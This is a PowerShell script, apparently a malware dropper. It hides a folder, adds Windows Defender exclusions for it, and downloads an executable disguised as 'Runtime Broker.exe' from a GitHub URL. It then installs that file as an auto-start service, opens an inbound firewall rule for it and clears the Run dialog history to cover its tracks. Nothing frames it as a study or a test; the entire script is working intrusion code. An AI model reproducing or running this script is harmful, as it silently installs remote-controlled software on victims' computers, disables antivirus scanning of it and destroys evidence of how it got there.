$root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Wizzard"
$servicio = "Wizard"
$ejecutable = "Runtime Broker.exe"
$rootFile = Join-Path -Path $root -ChildPath $ejecutable
$arch = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture


if (-not (Test-Path $root)) {
    try {
        New-Item -Path $root -ItemType Directory -Force
        Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
    }
    catch {
        exit 1
    }
}
else {
    try {
        Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
    }
    catch {
        exit 1
    }
}

try {
    Add-MpPreference -ExclusionPath $root
    Add-MpPreference -ExclusionProcess $rootFile
}
catch {
    exit 1
}

try {
    if ($arch -eq "64-bit") {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/64/Runtime%20Broker.exe" -Destination $rootFile
    }
    
    if ($arch -eq "32-bit") {
        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/32/Runtime%20Broker.exe" -Destination $rootFile
    }
}
catch {
    exit 1
}

try {
    $acl = Get-Acl $rootFile
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Usuarios", "FullControl", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $rootFile -AclObject $acl
}
catch {
    exit 1
}

try {
    New-Service -Name $servicio -BinaryPathName $rootFile -DisplayName $servicio -StartupType Automatic
}
catch {
    exit 1
}

try {
    New-NetFirewallRule -DisplayName $servicio -Direction Inbound -Program $rootFile -Action Allow -Profile Any -Enabled True
}
catch {
    exit 1
}

try {
    Start-Service -Name $servicio
}
catch {
    exit 1
}

try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
    
}
catch {
    exit 1
}

